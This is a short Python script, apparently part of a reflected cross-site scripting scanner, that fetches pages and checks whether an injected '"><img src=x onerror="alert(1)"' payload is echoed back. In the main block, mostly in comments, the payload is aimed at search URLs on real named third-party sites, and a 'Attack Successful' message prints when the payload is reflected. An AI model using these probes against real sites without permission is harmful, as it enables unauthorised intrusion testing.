from urllib.request import urlopen
import urllib.response
import urllib.request
import urllib.parse
import requests 
import urllib3 
from bs4 import BeautifulSoup

class web_request:  
    url = ''
    form_method = ''

    def __init__(self,url,method):
        self.url = url 
        self.form_method = method.lower()
        
    def get_source(self):    
        s1 = self.open_request()
        s2 = self.openurl()
        if len(s1) > len(s2): source = s1 
        else:   source = s2
        return source
    
    def open_request(self):
        session = requests.Session()
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36  (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
        'Content-Type': 'text/html',}
        try:
            resp = requests.get(self.url, headers=headers, timeout=10)
            pagesource = resp.text
            # print('{WebRequest} =>  \n', pagesource)
            # self.write_response_textfile(str(pagesource))
            return pagesource
        except:
            print('\n *[Requests Failed...]* ')
            return ''

    def openurl(self):  
        headers = {}
        headers['User-Agent'] = "Mozilla/5.0 (X11; Linux i686)"
        # print('urllib => \n' , self.url)
        try:
            req  = urllib.request.Request(self.url)
            resp = urllib.request.urlopen(req, timeout=10)
            pagesource = resp.read().decode(encoding='utf-8', errors='strict') 
            # print(pagesource)
            return pagesource
        except:
            print('\n *[Urrlib Failure ]*') 
            return ''

if __name__ == "__main__":
    
    # link = 'https://www.raremaps.com/'
    # link = 'https://www.zentechnologies.com/search/search.php?query="><img src=x onerror="alert(1)"&search=1'
    # link = 'https://ifu-institut.at/search?text="><img src=x onerror="alert(1)"&cms_token=30f71d2dffb99d557a11bb04966d80a0'
    link = 'https://www.sweetwater.com/'

    Web = web_request(link, 'get')
    resp = Web.open_request()
    
    urllib_resp = Web.openurl()
    # soup = BeautifulSoup(urllib_resp, features='lxml')
    # print(soup.find_all('form'))
    # resp = requests.post('https://ifu-institut.at/search?text="><img src=x onerror="alert(1)"&cms_token=30f71d2dffb99d557a11bb04966d80a0')
    print(resp)
    
    # source = r.text
    if( str(resp).__contains__('"><img src=x onerror="alert(1)"')):
        print('\n\n \t Attack Successful')
    
    print('{WebRequest}')